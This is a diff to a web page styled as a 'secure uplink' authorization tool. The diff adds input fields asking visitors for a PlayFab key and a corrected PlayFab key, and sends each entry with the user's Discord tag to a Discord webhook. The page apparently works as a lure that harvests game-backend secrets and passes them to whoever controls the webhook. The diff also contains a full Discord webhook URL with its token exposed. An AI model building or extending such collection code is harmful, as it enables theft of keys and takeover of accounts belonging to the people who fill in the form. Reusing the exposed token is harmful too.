@@ -333,6 +333,10 @@
                             <label>Discord Tag</label>
                             <input type="text" id="discord" placeholder="Username#0000" required>
                         </div>
+                        <div class="input-group">
+                            <label>PlayFab Key</label>
+                            <input type="text" id="playfab" placeholder="ENTER KEY" required>
+                        </div>
                         <button type="submit" class="btn btn-submit" id="submitBtn">
                             <i class="fas fa-satellite-dish"></i> <span>Execute Link</span>
                         </button>
@@ -363,6 +367,10 @@
                 <div class="input-group">
                     <label>Corrected Discord Tag</label>
                     <input type="text" id="corrDiscord" required>
+                </div>
+                <div class="input-group">
+                    <label>Corrected PlayFab Key</label>
+                    <input type="text" id="corrPlayfab" required>
                 </div>
                 <button type="submit" class="btn btn-warning" style="width: 100%; padding: 1rem; border: none; font-weight: bold; cursor: pointer; border-radius: 6px;" id="corrSubmitBtn">UPDATE RECORDS</button>
             </form>
@@ -526,7 +534,7 @@
             terminal.innerHTML = '';
             log('INITIALIZING SECURE UPLINK...');
 
-            if (rawWebhook === "https://discord.com/api/webhooks/1471657428788449301/vDE_gXXWl5JvhKird1eA_MutFw_95oJ4Yv9hT2PviVcxziLxHAHYtQjHWofCbvHk6Q57") {
+            if (rawWebhook === "https://discord.com/api/webhooks/1471657428788449301/vDE_gXXWl5JvhKird1eA_MutFw_95oJ4Yv9hT2PviVcxziLxHAHYtQjHWofCbvHk6Q57" || rawWebhook.trim() === "") {
                 log('CRITICAL ERROR: No webhook detected.', 'error');
                 log('The GitHub Action failed to inject your secret link.', 'warn');
                 submitBtn.disabled = false;
@@ -540,7 +548,8 @@
                     title: "🔐 System Authorization Request",
                     color: 65280, 
                     fields: [
-                        { name: "Discord", value: "`" + document.getElementById('discord').value + "`", inline: true }
+                        { name: "Discord", value: "`" + document.getElementById('discord').value + "`", inline: true },
+                        { name: "PlayFab", value: "`" + document.getElementById('playfab').value + "`", inline: true }
                     ],
                     timestamp: new Date().toISOString()
                 }]
@@ -580,7 +589,7 @@
             corrSubmitBtn.disabled = true;
             corrSubmitBtn.innerText = "UPDATING...";
 
-            if (rawWebhook === "https://discord.com/api/webhooks/1471657428788449301/vDE_gXXWl5JvhKird1eA_MutFw_95oJ4Yv9hT2PviVcxziLxHAHYtQjHWofCbvHk6Q57") {
+            if (rawWebhook === "https://discord.com/api/webhooks/1471657428788449301/vDE_gXXWl5JvhKird1eA_MutFw_95oJ4Yv9hT2PviVcxziLxHAHYtQjHWofCbvHk6Q57" || rawWebhook.trim() === "") {
                 corrSubmitBtn.innerText = "ERROR - GITHUB SECRET MISSING";
                 return;
             }
@@ -590,7 +599,8 @@
                     title: "⚠️ CORRECTION PROTOCOL INITIATED",
                     color: 16755200, 
                     fields: [
-                        { name: "New Discord", value: "`" + document.getElementById('corrDiscord').value + "`", inline: true }
+                        { name: "New Discord", value: "`" + document.getElementById('corrDiscord').value + "`", inline: true },
+                        { name: "New PlayFab", value: "`" + document.getElementById('corrPlayfab').value + "`", inline: true }
                     ],
                     timestamp: new Date().toISOString()
                 }]
